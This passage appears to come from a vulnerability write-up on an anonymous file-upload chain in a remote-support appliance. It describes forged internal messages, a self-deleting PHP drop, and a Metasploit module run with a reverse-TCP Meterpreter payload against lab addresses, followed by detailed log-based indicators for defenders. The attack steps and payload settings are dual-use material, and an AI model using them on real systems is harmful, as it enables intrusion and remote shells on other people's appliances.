after the session check: echo "0 success" >&0 workDir=`handleThinMint "$thinMint"` || exit if [[ ! -f "$workDir/thin-scc" ]]; then pushd "$workDir" cp $ingrediRoot/app/thin-scc . # ... omitted: license, image, and settings.ini setup ... else pushd "$workDir" fi export BRAIN_MELD_SOCKET_PATH=$ingrediRoot/data/tmp/brain.sock # ... omitted: server-side environment initialization ... ./thin-scc # [A4] Starts the worker inside the appliance environment. exitStatus=$? The same wrapper then prepares a working directory and starts thin-scc at [A4] . This process runs on the appliance, even though it is handling an anonymous customer's thin session. The native connection gives us a client for the internal message-routing system, referred to here as MRS. The thin connection gives us an appliance-side worker to address. Neither step requires a representative to accept the session. A network message can claim to be local MRS addresses have three parts: node:router:handler . There is a small catch when requesting the file: a URL ending in .php returns 404, even while the file existed. app/www/public/.htaccess explains why. source/app/www/public/.htaccess: # ... omitted: application routes and compatibility rewrites ... RewriteCond %{THE_REQUEST} "^[^ ]* .*?\.php[?/ ].*$" # [I1] Direct .php URLs return 404. RewriteRule .* - [L,R=404] # ... omitted: download-helper routes ... We also wanted to avoid guessing Remote Support’s working directory or the versioned installation name. The same native service can send us the worker's /proc/self/environ using UploadFiles . On this appliance, it contains: BG_app_root=/home/msfuser/ingredi-24.1.2 BRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock BG_app_root gives us the installation directory directly. Appending /app/www/public gives the upload destination; the socket path provides another way to identify the same root. There is one protocol wrinkle: procfs reports the environment file's size as zero, but the worker still streams its contents. We have to read through the data stream's EOF instead of stopping at the advertised size. Exploit The Metasploit module carries out the chain using two fresh public customer sessions. It discovers the thin worker through Director.GetGatewaySessionValues for its own thin guest, sends the forged LocalFileTransfer request to the worker's main dispatcher, and serves the PHP bytes over its existing MRS connection. A separate upload server is not needed. The module writes a random PHP filename into the site's public directory, then POSTs an execution token to the extensionless URL. The PHP file checks that token and unlinks itself before executing the payload. Target 0 runs a PHP payload; target 1 wraps a Unix command in PHP. For a PHP Meterpreter payload, the basic configuration is: use exploit/linux/http/beyondtrust_rs_mrs_file_upload set RHOSTS 192.168.1.98 set TARGET 0 set PAYLOAD php/meterpreter/reverse_tcp set LHOST 192.168.1.68 run verbose=true Select target 0 and a compatible command payload, such as php/meterpreter/reverse_tcp . The module documentation covers the directory override and other options. Figure 1: Exploiting the anonymous file-transfer service with Metasploit. Testing produced two PHP Meterpreter sessions, a command-wrapped PHP Meterpreter session, and a Bash shell. Both targets also ran with AutoCheck disabled, and immediate repeat exploitation succeeded. The Bash shell returned: uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),16(cron),70(postgres) IOCs The excerpts below cover HTTP requests, native file-transfer activity in thin-scc , and customer connections recorded by brain . They come from our lab runs on 28–29 October 2026 . Original timestamps, addresses, and paths are retained; session and transfer tokens are redacted where noted. Unrelated entries are omitted. The site logs are stored under $BG_app_root/log/ , where BG_app_root identifies the Remote Support installation directory: Log Evidence shown below httpd_access.log Public session creation and requests to uploaded PHP endpoints thin-scc.log Native file-transfer stream creation and routing errors thin-scc-errors.log Rejected file-transfer requests, including the action and destination path brain.log Customer connection records with client addresses and timestamps Active workers also keep logs under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/ ; the collection details below explain how these reach the site log directory. The installation path varies between appliances. Requests to an uploaded PHP endpoint The command-only Metasploit run created two public customer sessions, invoked its uploaded PHP endpoint, and then checked that the endpoint had gone. The relevant access-log lines are: 192.168.1.68 [28/Oct/2026:21:12:23 +0000] "POST /api/start_session HTTP/1.1" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:23 +0000] "POST /api/start_session HTTP/1.1" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:31 +0000] "POST /qdgusthrmlirprls HTTP/1.1" [0s] [Stat:200] [Size:0] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:38 +0000] "POST /qdgusthrmlirprls HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:43 +0000] "GET /qdgusthrmlirprls HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9] Here, /qdgusthrmlirprls mapped to qdgusthrmlirprls.php in the public directory. The first POST ran the command and returned 200. The later POST was the module's cleanup request; the GET independently checked the endpoint. Both received 404 after the file had deleted itself. This gives defenders a sequence to investigate: public session creation followed by a request to a new, unfamiliar endpoint, potentially followed by 404s for the same path. Session creation alone is normal Remote Support activity. A 200 followed by a 404 is also insufficient by itself; correlate the requests with file changes, session records, and any unusual outbound connections. The URL may not contain .php The earlier PHP canary produced these lines: 192.168.1.68 [28/Oct/2026:20:50:07 +0000] "GET /msfcanary03d80193f0880b.php HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9] 192.168.1.68 [28/Oct/2026:20:50:35 +0000] "GET /msfcanary03d80193f0880b HTTP/1.1" [0s] [Stat:200] [Size:368] [Ref:-] [UA:Python-urllib/3.9] 192.168.1.68 [28/Oct/2026:20:50:35 +0000] "GET /msfcanary03d80193f0880b HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9] The direct .php request failed, while the extensionless request executed the same file. The final 404 followed self-deletion. Detection that only searches for requests ending in .php would miss the successful request in this example. The native transfer itself travels inside the customer MRS connection. These access-log entries show the HTTP trigger, not the file contents or the forged router ID. The captured HTTP log does not expose the inner MRS messages, so it cannot establish the origin bypass on its own. Files and connections Look for unexpected PHP files under the site's public directory and receive files ending in .php.n$t . An interrupted transfer may leave the temporary file even if the final URL returns 404. The .n$t suffix also belongs to the normal transfer implementation, so its presence needs context. Native file-transfer traces thin-scc.log and thin-scc-errors.log contain more direct evidence of the file-service requests. For example, this line from thin-scc-errors.log names the action, native provider, and intended PHP destination. Only ckey and downloadToken have been redacted: 20261029 17:01:33 999999 thin-scc 11801:proc{LocalFileTransfer}(t11832) FT:WARNING>DISCARDING NONLOCAL MESSAGE: LocalFileTransfer:action=DownloadAnonymousFiles;ckey=<REDACTED>;downloadToken=<REDACTED>;enableResume=0;ftsName=local;path=/home/msfuser/ingredi-24.1.2/app/www/public/envresolve28f788af6a1c39bf.php;serverAddress=1:1022182175:9000;wantOverwritePrompts=0 This was our negative control: the request used the customer's ordinary source address and was rejected. It is evidence of an attempted invocation, not a successful upload. The forged local source passes the check that produces this warning, so a successful exploit need not leave a DISCARDING NONLOCAL MESSAGE entry. The successful PHP module run left these lines in thin-scc.log : 20261029 17:06:37 319 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_STREAM:INFO>createStream: connecting to address 1:1129726787:1031 20261029 17:06:37 2 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_CL:ERROR>nodeID not found in node list even after renumerating: 0 20261029 17:06:37 0 thin-scc 14419:proc{LocalFileTransfer}(t14486) MSG_DSP:ERROR>failed to create a mailbox for sending to: 0:0:0 Our requests omit responseAddress . The handler starts the transfer, then tries to send its action response to an empty address. That produces the 0:0:0 error without preventing the file write. The payload callback independently confirms execution at 17:06:37 . Look for this combination in the proc{LocalFileTransfer} context, especially around unfamiliar PHP requests or outbound connections. The 1:1129726787:1031 value identifies an internal MRS mailbox; use the brain connection records below for the client IP. These entries do not identify the written filename or prove execution on their own. The empty-address errors also depend on how the exploit request is constructed; another implementation may leave different traces. Brain connection records brain.log helps link the activity to a client address. These two entries preceded the same module run: 20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0' 20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1' These are useful for a timeline, but customer connections are normal activity. We found no UploadFiles or DownloadAnonymousFiles action records in the captured brain logs. Generic EOF, connection-reset, and conference errors also appeared; they are too broad to treat as exploit indicators by themselves. Where to collect the native logs The aggregated logs are under $BG_app_root/log/ . While a worker is running, its own logs are under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/ . The wrapper appends those logs to the site's log directory when the worker exits, then clears the per-worker copies. Collect both locations when investigating a live session. The captured brain.ini and thin-scc.ini both had the debug output disabled with enabled=0 . No debug log was captured, and we did not change the logging configuration. Brain's debug configuration also limits MRS_* categories to Info , so enabling its debug output alone would not guarantee detailed message payloads. Names such as UploadFileStarted and DownloadFileEnded occur in the native protocol's callback code, but we did not find them in the collected logs. They should not be presented as default audit events
